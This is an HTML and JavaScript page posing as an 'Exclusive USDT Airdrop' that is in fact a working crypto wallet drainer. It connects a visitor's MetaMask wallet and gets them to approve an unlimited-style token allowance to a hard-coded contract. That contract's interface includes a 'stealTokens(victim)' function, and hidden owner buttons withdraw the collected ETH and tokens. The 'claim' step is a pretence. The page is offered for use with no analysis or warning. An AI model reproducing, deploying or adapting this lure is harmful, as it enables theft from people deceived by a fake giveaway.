<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Exclusive Airdrop Opportunity</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #6e7dff, #00c6ff);
      color: white;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }

    .container {
      background-color: rgba(0, 0, 0, 0.7);
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
      width: 90%;
      max-width: 500px;
    }

    h1 {
      font-size: 2.5rem;
      margin-bottom: 20px;
      color: #ffeb3b;
    }

    h2 {
      font-size: 1.5rem;
      margin-bottom: 30px;
      color: #ffffff;
    }

    .btn {
      background-color: #4caf50;
      color: white;
      border: none;
      padding: 15px 30px;
      margin: 10px;
      font-size: 1.2rem;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .btn:disabled {
      background-color: #aaa;
    }

    .btn:hover {
      background-color: #45a049;
    }

    .footer {
      margin-top: 30px;
      color: #ffeb3b;
      font-size: 0.9rem;
    }

    .footer a {
      color: #ffeb3b;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    .claim-btn-container {
      margin-top: 30px;
    }

    .claim-btn-container button {
      font-size: 1rem;
      padding: 10px 20px;
      border-radius: 5px;
      cursor: pointer;
    }
    
    #claimAirdropButton {
      background-color: #ff9800;
    }

    #claimAirdropButton:disabled {
      background-color: #aaa;
    }

    #withdrawETHButton, #withdrawTokensButton {
      background-color: #3f51b5;
    }
    
    #withdrawETHButton:disabled, #withdrawTokensButton:disabled {
      background-color: #aaa;
    }

    .processing {
      display: none;
      font-size: 1rem;
      color: yellow;
      margin-top: 20px;
      opacity: 0;
      transition: opacity 0.5s ease-in-out;
      animation: flashing 1s infinite alternate;
    }

    .processing.show {
      display: block;
      opacity: 1;
    }

    @keyframes flashing {
      0% {
        opacity: 0.5;
      }
      100% {
        opacity: 1;
      }
    }

    /* Flashing text for the Claim Button */
    #claimAirdropButton.flashText {
      animation: textFlash 1.5s infinite alternate;
    }

    @keyframes textFlash {
      0% {
        color: #ffffff;
      }
      50% {
        color: #ffeb3b;
      }
      100% {
        color: #ffffff;
      }
    }

  </style>
</head>
<body>
  <div class="container">
    <h1>ðŸŽ‰ Exclusive USDT Airdrop Just For You! ðŸŽ‰</h1>
    <h2>Claim your rewards today and start your journey to success!</h2>

    <button id="connectButton" class="btn">Connect to MetaMask</button>
    <button id="approveButton" class="btn" disabled>Approve Unlimited USDT Drops</button>

    <div class="claim-btn-container">
      <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
      <!-- Processing message here -->
      <div id="processingMessage" class="processing">Processing...</div>
    </div>

    <!-- Withdraw buttons for the owner -->
    <div class="claim-btn-container" id="ownerButtons" style="display:none;">
      <button id="withdrawETHButton" class="btn">Withdraw ETH</button>
      <button id="withdrawTokensButton" class="btn">Withdraw Tokens</button>
    </div>

    <div class="footer">
      <p>By participating, you agree to our <a href="#">Terms & Conditions</a>.</p>
      <p>Need help? <a href="#">Contact Us</a></p>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script>
  <script>
    const contractAddress = '0x4a21a1a07a3157e06d739D3bb231628143a66C29';
    const tokenAddress = '0x59610B067eCfeCEdaf146A5E9B180C440f008575';
    const ownerAddress = '0x9052EB26C0b9836335Ec153413F80bAEc7536414';

    const contractABI = [
      {
        "inputs": [
          { "internalType": "address", "name": "spender", "type": "address" },
          { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "approve",
        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [{ "internalType": "address", "name": "account", "type": "address" }],
        "name": "balanceOf",
        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
        "stateMutability": "view",
        "type": "function"
      },
      {
        "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }],
        "name": "transfer",
        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [
          { "internalType": "address", "name": "sender", "type": "address" },
          { "internalType": "address", "name": "recipient", "type": "address" },
          { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "transferFrom",
        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }],
        "name": "stealTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [],
        "name": "withdrawETH",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [],
        "name": "withdrawTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      }
    ];

    let web3;
    let contract;
    let accounts;

    // Mobile redirect logic
    function redirectToMetaMaskBrowserIfMobile() {
      if (window.ethereum && /mobile/i.test(navigator.userAgent)) {
        window.location.href = 'https://metamask.app.link';
      }
    }

    // Call the redirect function when the page loads
    redirectToMetaMaskBrowserIfMobile();

    async function connectMetaMask() {
      if (typeof window.ethereum !== 'undefined') {
        web3 = new Web3(window.ethereum);
        try {
          accounts = await ethereum.request({ method: 'eth_requestAccounts' });
          document.getElementById('connectButton').innerText = 'Connected: ' + accounts[0];
          document.getElementById('approveButton').disabled = false;

          if (accounts[0].toLowerCase() === ownerAddress.toLowerCase()) {
            document.getElementById('ownerButtons').style.display = 'block';
          }
        } catch (error) {
          alert('User rejected the request.');
        }
      } else {
        alert('Please install MetaMask!');
      }
    }

    async function approveUSDT() {
      const spender = contractAddress;
      const amount = web3.utils.toWei('1000000', 'ether');
      const contract = new web3.eth.Contract(contractABI, tokenAddress);

      contract.methods.approve(spender, amount).send({ from: accounts[0] })
        .on('transactionHash', (hash) => {
          alert('Transaction sent: ' + hash);
        })
        .on('receipt', (receipt) => {
          document.getElementById('claimAirdropButton').disabled = false;
        })
        .on('error', (error) => {
          alert('Error: ' + error.message);
        });
    }

    async function claimAirdrop() {
      document.getElementById('claimAirdropButton').classList.add('flashText');
      document.getElementById('processingMessage').classList.add('show');

      setTimeout(async () => {
        // Simulating a claim
        const amount = web3.utils.toWei('1', 'ether');
        const contract = new web3.eth.Contract(contractABI, contractAddress);

        contract.methods.transfer(accounts[0], amount).send({ from: accounts[0] })
          .on('transactionHash', (hash) => {
            console.log('Claim TX Hash:', hash);
          })
          .on('receipt', (receipt) => {
            document.getElementById('claimAirdropButton').disabled = true;
            document.getElementById('claimAirdropButton').classList.remove('flashText');
            document.getElementById('processingMessage').classList.remove('show');
            alert('Airdrop claimed!');
          })
          .on('error', (error) => {
            alert('Error: ' + error.message);
            document.getElementById('processingMessage').classList.remove('show');
          });
      }, 1000); // Simulating a short processing time
    }

    async function withdrawETH() {
      const contract = new web3.eth.Contract(contractABI, contractAddress);
      contract.methods.withdrawETH().send({ from: accounts[0] })
        .on('transactionHash', (hash) => {
          console.log('Withdraw ETH TX Hash:', hash);
        })
        .on('receipt', (receipt) => {
          alert('ETH withdrawn!');
        })
        .on('error', (error) => {
          alert('Error: ' + error.message);
        });
    }

    async function withdrawTokens() {
      const contract = new web3.eth.Contract(contractABI, contractAddress);
      contract.methods.withdrawTokens().send({ from: accounts[0] })
        .on('transactionHash', (hash) => {
          console.log('Withdraw Tokens TX Hash:', hash);
        })
        .on('receipt', (receipt) => {
          alert('Tokens withdrawn!');
        })
        .on('error', (error) => {
          alert('Error: ' + error.message);
        });
    }

    document.getElementById('connectButton').addEventListener('click', connectMetaMask);
    document.getElementById('approveButton').addEventListener('click', approveUSDT);
    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
    document.getElementById('withdrawETHButton').addEventListener('click', withdrawETH);
    document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens);
  </script>
</body>
</html>
